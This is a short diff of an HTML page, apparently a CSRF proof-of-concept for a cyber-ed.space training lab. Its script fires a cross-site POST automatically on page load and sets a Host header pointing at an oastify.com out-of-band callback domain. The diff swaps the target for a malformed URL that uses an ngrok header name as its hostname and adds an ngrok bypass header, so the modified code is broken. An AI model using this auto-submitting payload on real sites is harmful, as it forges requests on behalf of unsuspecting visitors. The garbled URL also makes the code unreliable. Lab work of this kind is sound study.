@@ -5,10 +5,11 @@
     <script>
         document.addEventListener("DOMContentLoaded", function() {
             var xhr = new XMLHttpRequest();
-            xhr.open("POST", "https://web.v5zfb9ly6yxc1einjlds.labs.cyber-ed.space/main.php", true);
+            xhr.open("POST", "https://ngrok-skip-browser-warning/csrf_xhr.html", true);
             xhr.setRequestHeader("Host", "ojbtmjwdkdjsih4jfs86s4h5ww2nqde2.oastify.com");
             xhr.setRequestHeader("User-Agent", "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0");
             xhr.setRequestHeader("Accept", "*/*");
+            xhr.setRequestHeader("ngrok-skip-browser-warning", "123");
             xhr.setRequestHeader("Accept-Language", "ru,en-US;q=0.7,en;q=0.3");
             xhr.setRequestHeader("Accept-Encoding", "gzip, deflate, br");
             xhr.setRequestHeader("Referer", "https://web.v5zfb9ly6yxc1einjlds.labs.cyber-ed.space/main.php");
